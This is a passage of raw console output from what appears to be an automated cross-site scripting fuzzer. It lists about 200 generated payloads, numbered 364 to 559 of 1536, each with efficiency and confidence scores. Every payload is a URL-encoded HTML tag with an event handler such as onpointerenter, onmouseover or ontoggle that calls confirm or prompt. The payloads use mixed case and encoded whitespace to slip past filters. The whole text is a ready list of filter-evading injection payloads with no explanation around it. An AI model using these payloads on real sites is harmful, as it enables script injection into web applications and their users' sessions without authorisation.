 Payload: <A%0aONPoINtErEntEr%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 364/1536 ------------------------------------------------------------
 Payload: <A/+/oNpoInTeRENTer%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 365/1536 ------------------------------------------------------------
 Payload: <HtMl%0dONpOinTerenter%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 366/1536 ------------------------------------------------------------
 Payload: <HtML%0donmOuSeoVer%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 367/1536 ------------------------------------------------------------
 Payload: <htMl%09OnpoiNTeREnter%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 368/1536 ------------------------------------------------------------
 Payload: <HTML/+/oNmOuSeoVeR%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 369/1536 ------------------------------------------------------------
 Payload: <Html/+/OnPOiNteRENtER%0a=%0a(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 370/1536 ------------------------------------------------------------
 Payload: <Html%0aoNMoUSeovEr%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 371/1536 ------------------------------------------------------------
 Payload: <D3v%0aOnpoInTeRenTeR%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 372/1536 ------------------------------------------------------------
 Payload: <D3v%0aoNpOiNterenTEr%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 373/1536 ------------------------------------------------------------
 Payload: <dETails%0aONPOiNTeRenTEr%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 374/1536 ------------------------------------------------------------
 Payload: <deTAilS%0aoNpOiNTeRentEr%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 375/1536  Progress: 376/1536 ------------------------------------------------------------
 Payload: <DeTAILs%0doNpOINTERenTer%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 377/1536  Progress: 378/1536 ------------------------------------------------------------
 Payload: <HTml%0dOnMOusEovEr%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 379/1536 ------------------------------------------------------------
 Payload: <d3V/+/OnPoInTErEntEr+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 380/1536 ------------------------------------------------------------
 Payload: <d3V%09oNmousEOver%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 381/1536 ------------------------------------------------------------
 Payload: <D3v%0dOnpOinTerenteR%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 382/1536  Progress: 383/1536 ------------------------------------------------------------
 Payload: <A%0dONMoUSEOver%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 384/1536  Progress: 385/1536  Progress: 386/1536  Progress: 387/1536 ------------------------------------------------------------
 Payload: <HTmL%0aONPoinTeRenteR%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 388/1536 ------------------------------------------------------------
 Payload: <a%0dONpoINteRenTer%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 389/1536 ------------------------------------------------------------
 Payload: <detAIls%0dOnPoiNteReNtEr%0a=%0a(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 390/1536 ------------------------------------------------------------
 Payload: <a%09OnMOuseOVEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 391/1536  Progress: 392/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONMouseOVeR%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 393/1536 ------------------------------------------------------------
 Payload: <dETAiLS%09oNPOinterEnTer%0d=%0d[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 394/1536 ------------------------------------------------------------
 Payload: <dETAILS%0doNpoiNTEReNtEr+=+[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 395/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNMOUSEoveR%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 396/1536 ------------------------------------------------------------
 Payload: <A%09ONmOusEovER%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 397/1536 ------------------------------------------------------------
 Payload: <HTMl%0aONpoINTERenTEr%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 398/1536 ------------------------------------------------------------
 Payload: <A%09ONpOINterENTEr%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 399/1536 ------------------------------------------------------------
 Payload: <HtMl%0dONPoINterenter%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 400/1536 ------------------------------------------------------------
 Payload: <DEtails%0donTOGGle%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 401/1536 ------------------------------------------------------------
 Payload: <a%0aoNMOusEoveR%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 402/1536 ------------------------------------------------------------
 Payload: <A%0dONpoinTeRENTEr%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 403/1536 ------------------------------------------------------------
 Payload: <a%0aoNmoUsEOvEr%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 404/1536 ------------------------------------------------------------
 Payload: <D3v%0aoNPointErenter%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 405/1536 ------------------------------------------------------------
 Payload: <a%09oNpOiNTEReNTER%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 406/1536 ------------------------------------------------------------
 Payload: <hTmL/+/onmoUsEOVER+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 407/1536 ------------------------------------------------------------
 Payload: <DeTaiLs%09onPoInterENTER%0a=%0a[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 408/1536  Progress: 409/1536 ------------------------------------------------------------
 Payload: <A/+/oNPOinTErENTER%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 410/1536 ------------------------------------------------------------
 Payload: <HtmL%0dONpOinterenTER+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 411/1536 ------------------------------------------------------------
 Payload: <DeTaIlS/+/onTOGglE%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 412/1536 ------------------------------------------------------------
 Payload: <HtML%0aOnPOINTeREntER%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 413/1536 ------------------------------------------------------------
 Payload: <dEtaILS%09oNTOGgLe%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 414/1536 ------------------------------------------------------------
 Payload: <HTML%09ONpOiNtEREnteR%0d=%0da=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 415/1536 ------------------------------------------------------------
 Payload: <DeTailS%0donTogglE+=+[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 416/1536 ------------------------------------------------------------
 Payload: <HTmL/+/OnpOINTErEnTER%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 417/1536 ------------------------------------------------------------
 Payload: <DEtaIls%0dOnTOGgle%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 418/1536 ------------------------------------------------------------
 Payload: <html%09onpOinTeREnTeR+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 419/1536 ------------------------------------------------------------
 Payload: <HTML%09oNMOuSeOVEr%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 420/1536 ------------------------------------------------------------
 Payload: <HTml/+/oNPOiNtERentER+=+(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 421/1536 ------------------------------------------------------------
 Payload: <d3v%0dOnmOUSEoVeR%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 422/1536  Progress: 423/1536 ------------------------------------------------------------
 Payload: <DETaiLs%0donPoInteReNTER%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 424/1536  Progress: 425/1536 ------------------------------------------------------------
 Payload: <A/+/oNmOUsEOVeR%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 426/1536 ------------------------------------------------------------
 Payload: <a%0aONpoINTERENtEr%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 427/1536 ------------------------------------------------------------
 Payload: <d3v%0doNmoUSEover%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 428/1536 ------------------------------------------------------------
 Payload: <d3v%0doNmouSEoveR%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 429/1536 ------------------------------------------------------------
 Payload: <deTAILs%09ONpointeREnTer+=+[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 430/1536 ------------------------------------------------------------
 Payload: <details%09ONpOiNTErEntER%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 431/1536 ------------------------------------------------------------
 Payload: <D3v%0dONmOUSeOVeR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 432/1536 ------------------------------------------------------------
 Payload: <a%09onPOinTErEnteR%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 433/1536 ------------------------------------------------------------
 Payload: <HtmL%0aoNPoIntErENTer%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 434/1536 ------------------------------------------------------------
 Payload: <a%0aonPOInteRenTer%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 435/1536 ------------------------------------------------------------
 Payload: <a%0dOnmOuSeOvER%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 436/1536 ------------------------------------------------------------
 Payload: <D3v%0aOnPOInterEntER%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 437/1536  Progress: 438/1536 ------------------------------------------------------------
 Payload: <A/+/oNMoUseover%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 439/1536 ------------------------------------------------------------
 Payload: <HtMl%0doNpoiNtEReNTER%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 440/1536 ------------------------------------------------------------
 Payload: <D3V%0aoNPoINteREnTEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 441/1536 ------------------------------------------------------------
 Payload: <HTml/+/onpOINteRENTEr%0d=%0d(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 442/1536 ------------------------------------------------------------
 Payload: <DetaILs%0aontOGGlE%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 443/1536 ------------------------------------------------------------
 Payload: <dETAiLS/+/Ontoggle%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 444/1536 ------------------------------------------------------------
 Payload: <DeTAIlS%0donpOiNTerenTeR%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 445/1536 ------------------------------------------------------------
 Payload: <detaIlS/+/oNpoINTeReNTeR%0a=%0aconfirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 446/1536 ------------------------------------------------------------
 Payload: <a%0dONpOinTEREnTeR+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 447/1536 ------------------------------------------------------------
 Payload: <a%0dONmOUSEOvEr%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 448/1536  Progress: 449/1536 ------------------------------------------------------------
 Payload: <D3v%0aONmOUSEOVER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 450/1536 ------------------------------------------------------------
 Payload: <a%09oNmouSEOvEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 451/1536 ------------------------------------------------------------
 Payload: <D3V%09oNMoUseOvER%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 452/1536  Progress: 453/1536 ------------------------------------------------------------
 Payload: <d3V%09onPointERenTeR%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 454/1536 ------------------------------------------------------------
 Payload: <d3V%0dONpoInTErENter%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 455/1536 ------------------------------------------------------------
 Payload: <HTmL%09onpoInTEReNTer%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 456/1536 ------------------------------------------------------------
 Payload: <HTml%0aoNpointerenter%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 457/1536 ------------------------------------------------------------
 Payload: <D3v%09oNpoInTeREnTER+=+(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 458/1536 ------------------------------------------------------------
 Payload: <html%09oNmOuSeOVEr%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 459/1536 ------------------------------------------------------------
 Payload: <DeTails/+/oNpOiNtereNTEr%0d=%0dconfirm()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 460/1536 ------------------------------------------------------------
 Payload: <A%09ONpoiNTErEntEr%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 461/1536 ------------------------------------------------------------
 Payload: <DEtaIlS%0aOnPOINTErEnTer+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 462/1536 ------------------------------------------------------------
 Payload: <DeTAiLS/+/oNPoIntErENTer+=+(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 463/1536 ------------------------------------------------------------
 Payload: <a%09ONPOinTErEnteR+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 464/1536 ------------------------------------------------------------
 Payload: <d3v%0aoNPoINtEReNtEr%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 465/1536 ------------------------------------------------------------
 Payload: <D3V%0donpoINTeRENTeR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 466/1536 ------------------------------------------------------------
 Payload: <Html%09onpoiNTEReNteR%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 467/1536 ------------------------------------------------------------
 Payload: <d3V%0dONpoInTerEnTeR%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 468/1536 ------------------------------------------------------------
 Payload: <dETAILS%0donPointEReNteR%09=%09a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 469/1536 ------------------------------------------------------------
 Payload: <HtML/+/ONMoUSEovEr%0d=%0d(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 470/1536 ------------------------------------------------------------
 Payload: <a%0doNMouSeovEr+=+[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 471/1536 ------------------------------------------------------------
 Payload: <hTMl/+/onPoiNterENTEr%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 472/1536 ------------------------------------------------------------
 Payload: <d3v%0doNPOiNtErenTEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 473/1536 ------------------------------------------------------------
 Payload: <dETAILs%0aonpOiNTeRENter%0a=%0a(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 474/1536 ------------------------------------------------------------
 Payload: <a%0dOnMoUseoVEr%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 475/1536 ------------------------------------------------------------
 Payload: <D3v%09ONpOINteRenTER+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 476/1536 ------------------------------------------------------------
 Payload: <a%09OnpOinTErENtER%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 477/1536 ------------------------------------------------------------
 Payload: <d3v%0doNMOUSEOVER%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 478/1536 ------------------------------------------------------------
 Payload: <HTml/+/ONMousEOvER%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 479/1536 ------------------------------------------------------------
 Payload: <a%09ONmOusEover%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 480/1536  Progress: 481/1536 ------------------------------------------------------------
 Payload: <D3V/+/onMOuSeOVEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 482/1536 ------------------------------------------------------------
 Payload: <a/+/onpoiNTEreNteR%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 483/1536 ------------------------------------------------------------
 Payload: <A%0aonmousEOveR%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 484/1536  Progress: 485/1536 ------------------------------------------------------------
 Payload: <D3v%09ONMOusEoveR+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 486/1536 ------------------------------------------------------------
 Payload: <D3v%0aonmOUSEOver%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 487/1536 ------------------------------------------------------------
 Payload: <a%0aONmOUsEovEr+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 488/1536 ------------------------------------------------------------
 Payload: <A%0aONMoUSEovER%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 489/1536 ------------------------------------------------------------
 Payload: <A%0doNmouSEoVeR%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 490/1536 ------------------------------------------------------------
 Payload: <Html/+/OnMOUseOveR+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 491/1536 ------------------------------------------------------------
 Payload: <d3v%0aONMouSEOver%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 492/1536  Progress: 493/1536 ------------------------------------------------------------
 Payload: <htML/+/onPOIntERENtER%09=%09a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 494/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnPoInteRENTer+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 495/1536 ------------------------------------------------------------
 Payload: <A%0doNPoiNtEREntEr+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 496/1536 ------------------------------------------------------------
 Payload: <D3V%09oNMOUSEOVER%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 497/1536 ------------------------------------------------------------
 Payload: <DETAILs/+/OntOgglE%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 498/1536 ------------------------------------------------------------
 Payload: <dEtaiLS%0aonPoiNtereNTER%09=%09[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 499/1536 ------------------------------------------------------------
 Payload: <htMl/+/onmOUseOvEr%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 500/1536 ------------------------------------------------------------
 Payload: <a%0doNmOuSeoveR+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 501/1536 ------------------------------------------------------------
 Payload: <htmL%09oNpOiNtEREntEr%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 502/1536  Progress: 503/1536 ------------------------------------------------------------
 Payload: <d3V%0donPOiNterentER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 504/1536 ------------------------------------------------------------
 Payload: <A%0donPOinTEREnTEr%09=%09(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 505/1536  Progress: 506/1536 ------------------------------------------------------------
 Payload: <DetAilS%0dOnpoiNTereNtEr%0d=%0da=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 507/1536 ------------------------------------------------------------
 Payload: <a%0aoNmOUSeOveR+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 508/1536 ------------------------------------------------------------
 Payload: <hTmL%09OnpoINteREnteR%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 509/1536 ------------------------------------------------------------
 Payload: <A%0aonpoInTeRenteR+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 510/1536 ------------------------------------------------------------
 Payload: <DETails%0donTOGgLe%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 511/1536 ------------------------------------------------------------
 Payload: <dETaILS%09oNpOinterentER%09=%09[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 512/1536  Progress: 513/1536 ------------------------------------------------------------
 Payload: <hTML/+/onpoiNTereNTEr%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 514/1536 ------------------------------------------------------------
 Payload: <d3V%0aONmOuseOVER+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 515/1536 ------------------------------------------------------------
 Payload: <HtML/+/oNPoINTEReNTeR%0d=%0d(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 516/1536 ------------------------------------------------------------
 Payload: <detAiLS%0dONpoinTERENtER%0d=%0d[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 517/1536 ------------------------------------------------------------
 Payload: <a%09ONMoUSEOveR%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 518/1536 ------------------------------------------------------------
 Payload: <d3v/+/oNMouseovEr%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 519/1536 ------------------------------------------------------------
 Payload: <D3v%0doNmouSeOVEr%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 520/1536 ------------------------------------------------------------
 Payload: <a%0doNPOIntEreNTER%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 521/1536  Progress: 522/1536 ------------------------------------------------------------
 Payload: <d3V/+/onpoINteRENTeR%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 523/1536 ------------------------------------------------------------
 Payload: <D3V%09oNMOUsEoVEr%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 524/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnmOuSeOVEr%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 525/1536  Progress: 526/1536 ------------------------------------------------------------
 Payload: <DETaILs%09onTogGLE%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 527/1536 ------------------------------------------------------------
 Payload: <deTaiLS%09ONPOIntEReNTEr+=+(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 528/1536 ------------------------------------------------------------
 Payload: <htMl/+/ONMOUSeovER%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 529/1536 ------------------------------------------------------------
 Payload: <D3V%0aonPOiNtErenter+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 530/1536 ------------------------------------------------------------
 Payload: <hTmL%0aONpoInterenTer%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 531/1536 ------------------------------------------------------------
 Payload: <D3v%0aONMOUSEover%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 532/1536 ------------------------------------------------------------
 Payload: <d3v/+/OnpOInteReNTEr%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 533/1536 ------------------------------------------------------------
 Payload: <a/+/oNmouSeoveR%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 534/1536 ------------------------------------------------------------
 Payload: <HtmL%0doNmoUSeOVEr%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 535/1536 ------------------------------------------------------------
 Payload: <HTml%09oNpOINTERENteR%0a=%0a(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 536/1536 ------------------------------------------------------------
 Payload: <HtML/+/onmOUSEOVer%0a=%0a(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 537/1536 ------------------------------------------------------------
 Payload: <D3v/+/onmOUsEOVeR%09=%09a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 538/1536 ------------------------------------------------------------
 Payload: <a/+/onMOusEOver+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 539/1536 ------------------------------------------------------------
 Payload: <HTML%0doNpoiNteREnter%0a=%0a(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 540/1536 ------------------------------------------------------------
 Payload: <a%0doNMoUsEOvER%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 541/1536 ------------------------------------------------------------
 Payload: <DETaiLS%09ONPOINterenTER%09=%09(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 542/1536 ------------------------------------------------------------
 Payload: <HTML%0aONMouSeoVeR%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 543/1536 ------------------------------------------------------------
 Payload: <d3v/+/onMOusEOveR%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 544/1536  Progress: 545/1536 ------------------------------------------------------------
 Payload: <DETaIlS%0dOnPOInTereNteR%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 546/1536 ------------------------------------------------------------
 Payload: <D3V%0aonPoINteRenTEr+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 547/1536 ------------------------------------------------------------
 Payload: <DEtAiLS%09onTOGglE%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 548/1536 ------------------------------------------------------------
 Payload: <a%0doNPointERENTeR%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 549/1536 ------------------------------------------------------------
 Payload: <a%0aONMouSEovER%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 550/1536 ------------------------------------------------------------
 Payload: <d3v/+/ONpoINtereNTer%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 551/1536  Progress: 552/1536 ------------------------------------------------------------
 Payload: <a/+/oNPOINTErENTEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 553/1536 ------------------------------------------------------------
 Payload: <a%0doNpoInteRENtEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 554/1536 ------------------------------------------------------------
 Payload: <A%09OnPoinTEreNtEr%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 555/1536  Progress: 556/1536 ------------------------------------------------------------
 Payload: <a%0doNmousEOVer%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 557/1536 ------------------------------------------------------------
 Payload: <dEtAIls%09oNPoiNtErENTER%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 558/1536 ------------------------------------------------------------
 Payload: <d3v/+/OnPointeRENtER%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 559/1536 ------------------------------------------------------------
